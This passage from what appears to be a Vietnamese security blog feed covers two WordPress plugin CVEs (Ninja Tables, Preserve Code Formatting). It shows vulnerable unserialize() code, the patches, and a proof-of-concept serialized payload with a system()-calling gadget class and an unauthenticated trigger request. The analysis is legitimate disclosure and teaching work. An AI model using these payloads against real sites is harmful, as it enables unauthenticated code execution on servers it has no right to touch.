.018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o class ƒë·ªÉ test ƒë·∫∑t trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Cho request ƒëi qua proxy c·ªßa BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request v·ªõi args[callback] ch·ª©a chu·ªói serialized ƒë∆∞·ª£c encode base64&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;args[callback] = base64_encode(&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:4:&amp;#34;ls /&amp;#34;;}&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[callback]=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ== HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-21-cve-2025-2939/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-21-cve-2025-2939/result.png&#39; alt=&#34;Result&#34; height=&#34;828&#34; width=&#34;1471&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;C√°c phi√™n b·∫£n &amp;lt;= 5.0.18 c·ªßa plugin Ninja Tables x·ª≠ l√Ω tham s·ªë &lt;code&gt;args[callback]&lt;/code&gt; kh√¥ng an to√†n, d·∫´n ƒë·∫øn vi·ªác th·ª±c thi &lt;code&gt;unserialize()&lt;/code&gt; tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng m√† kh√¥ng c√≥ b·∫•t k·ª≥ b∆∞·ªõc x√°c th·ª±c n√†o. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c ƒë∆∞a v√†o payload ch·ª©a object ƒë·ªôc h·∫°i v√† th·ª±c thi m√£ tr√™n server. B·∫£n c·∫≠p nh·∫≠t 5.0.19 lo·∫°i b·ªè ho√†n to√†n vi·ªác s·ª≠ d·ª•ng &lt;code&gt;unserialize()&lt;/code&gt; v√† thay th·∫ø b·∫±ng &lt;code&gt;json_decode&lt;/code&gt;, gi·∫£i quy·∫øt tri·ªát ƒë·ªÉ l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c ph√©p d√πng cho d·ªØ li·ªáu nh·∫≠n t·ª´ client n·∫øu kh√¥ng c√≥ x√°c th·ª±c.&lt;/li&gt;&#xA;&lt;li&gt;Ajax hook &lt;code&gt;admin_post_nopriv_*&lt;/code&gt; m·ªü b·ªÅ m·∫∑t t·∫•n c√¥ng cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ c·∫ßn m·ªôt request HTTP l√† c√≥ th·ªÉ k√≠ch ho·∫°t khai th√°c.&lt;/li&gt;&#xA;&lt;li&gt;B·∫£n v√° 5.0.19 x·ª≠ l√Ω ƒë√∫ng h∆∞·ªõng b·∫±ng c√°ch chuy·ªÉn sang ƒë·ªãnh d·∫°ng an to√†n h∆°n nh∆∞ JSON.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-php-object-injection-to-limited-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables ‚Äì Easy Data Table Builder Plugin &amp;lt;= 5.0.18 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53572 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/</link>
      <pubDate>Thu, 20 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; trong Scott Reilly &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt; &lt;em&gt;preserve-code-formatting&lt;/em&gt; cho ph√©p &lt;strong&gt;Object Injection&lt;/strong&gt;. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt;: t·ª´ &lt;code&gt;n/a&lt;/code&gt; ƒë·∫øn &amp;lt;= &lt;code&gt;4.0.1&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53572&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53572&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/preserve-code-formatting/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Preserve Code Formatting Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v4.0.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒëo·∫°n m√£ n√†y, h√†m &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng (&lt;code&gt;$match[2]&lt;/code&gt; sau khi gi·∫£i m√£ base64). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy c∆° Object Injection&lt;/strong&gt;: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn &lt;strong&gt;Object Injection&lt;/strong&gt; v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thi·∫øu ki·ªÉm tra an to√†n&lt;/strong&gt;: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng c√≥ c∆° ch·∫ø fallback&lt;/strong&gt;: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v5.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/diff.png&#39; alt=&#34;Diff&#34; height=&#34;798&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thay th·∫ø &lt;code&gt;unserialize()&lt;/code&gt; b·∫±ng &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$decoded_data = str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $matches[2] ) ) );&#xA;if ( ! $this-&amp;gt;is_content_safe( $decoded_data ) ) {&#xA;    return $matches[0];&#xA;}&#xA;$data = json_decode( $decoded_data, true );&#xA;if ( $data === null &amp;amp;&amp;amp; json_last_error() !== JSON_ERROR_NONE ) {&#xA;    $data = $decoded_data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kh√¥ng c√≤n d√πng &lt;code&gt;unserialize()&lt;/code&gt; ‚Üí lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng &lt;code&gt;PHP Object Injection&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt filter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter( &amp;#39;content_save_pre&amp;#39;, array( $this, &amp;#39;preserve_postprocess&amp;#39; ), 100 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hook &lt;code&gt;content_save_pre&lt;/code&gt;: ƒë∆∞·ª£c g·ªçi tr∆∞·ªõc khi n·ªôi dung b√†i vi·∫øt ƒë∆∞·ª£c l∆∞u v√†o c∆° s·ªü d·ªØ li·ªáu. ƒê√¢y l√† th·ªùi ƒëi·ªÉm th√≠ch h·ª£p ƒë·ªÉ can thi·ªáp, ch·ªânh s·ª≠a ho·∫∑c l·ªçc n·ªôi dung.&lt;/p&gt;&#xA;&lt;p&gt;Khi filter ƒë∆∞·ª£c k√≠ch ho·∫°t th√¨ callback &lt;code&gt;preserve_postprocess&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function preserve_postprocess( $content, $preserve = false ) {&#xA;    $options                    = $this-&amp;gt;get_options();&#xA;    $preserve_tags              = (array) $options[&amp;#39;preserve_tags&amp;#39;];&#xA;    $wrap_multiline_code_in_pre = (bool)  $options[&amp;#39;wrap_multiline_code_in_pre&amp;#39;];&#xA;    $result                     = &amp;#39;&amp;#39;;&#xA;&#xA;    foreach ( $preserve_tags as $tag ) {&#xA;        if ( $result ) {&#xA;            $content = $result;&#xA;            $result = &amp;#39;&amp;#39;;&#xA;        }&#xA;&#xA;        $codes = preg_split( &amp;#34;/(\\{\\!\\{{$tag}[^\\]]*\\}\\!\\}.*\\{\\!\\{\\/{$tag}\\}\\!\\})/Us&amp;#34;, $content, -1, PREG_SPLIT_DELIM_CAPTURE );&#xA;&#xA;        foreach ( $codes as $code ) {&#xA;            if ( preg_match( &amp;#34;/\\{\\!\\{({$tag}[^\\]]*)\\}\\!\\}(.*)\\{\\!\\{\\/{$tag}\\}\\!\\}/Us&amp;#34;, $code, $match ) ) {&#xA;                // Note: base64_decode is only being used to decode user-supplied content of code tags which&#xA;                // had been encoded earlier in the filtering process to prevent modification by WP.&#xA;                $data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&#xA;                if ( $preserve ) {&#xA;                    $data = $this-&amp;gt;preserve_code_formatting( $data );&#xA;                }&#xA;                $code = &amp;#34;&amp;lt;{$match[1]}&amp;gt;$data&amp;lt;/$tag&amp;gt;&amp;#34;;&#xA;                if ( $preserve &amp;amp;&amp;amp; $wrap_multiline_code_in_pre &amp;amp;&amp;amp; ( &amp;#39;pre&amp;#39; != $tag ) &amp;amp;&amp;amp; preg_match( &amp;#34;/\n/&amp;#34;, $data ) ) {&#xA;                    $code = &amp;#39;&amp;lt;pre&amp;gt;&amp;#39; . $code . &amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;;&#xA;                }&#xA;            }&#xA;            $result .= $code;&#xA;        }&#xA;    }&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·∫∑t breakpoint v√†o ƒë·∫ßu h√†m &lt;code&gt;preserve_postprocess()&lt;/code&gt;, th·ª≠ t·∫°o m·ªôt post b·∫•t k·ª≥:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp/v2/posts/129?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wp-settings-time-3=1763365761; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1763781752%7CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq%7Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de; wp-settings-2=libraryContent%3Dbrowse; wp-settings-time-2=1763608953&#xA;...&#xA;{&amp;#34;id&amp;#34;:129,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:paragraph --&amp;gt;\n&amp;lt;p&amp;gt;Payload&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;,&amp;#34;title&amp;#34;:&amp;#34;Test&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/content.png&#34; title=&#34;Gi√° tr·ªã c·ªßa $content&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/content.png&#34; data-sub-html=&#34;&lt;h2&gt;Content&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa $content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/content.png&#39; alt=&#34;Content&#34; height=&#34;579&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa $content&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta th·∫•y &lt;code&gt;$content&lt;/code&gt; s·∫Ω t∆∞∆°ng ·ª©ng v·ªõi gi√° tr·ªã c·ªßa &lt;code&gt;&amp;quot;content&amp;quot;&lt;/code&gt; ta truy·ªÅn khi t·∫°o post.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$codes = preg_split(&#xA;    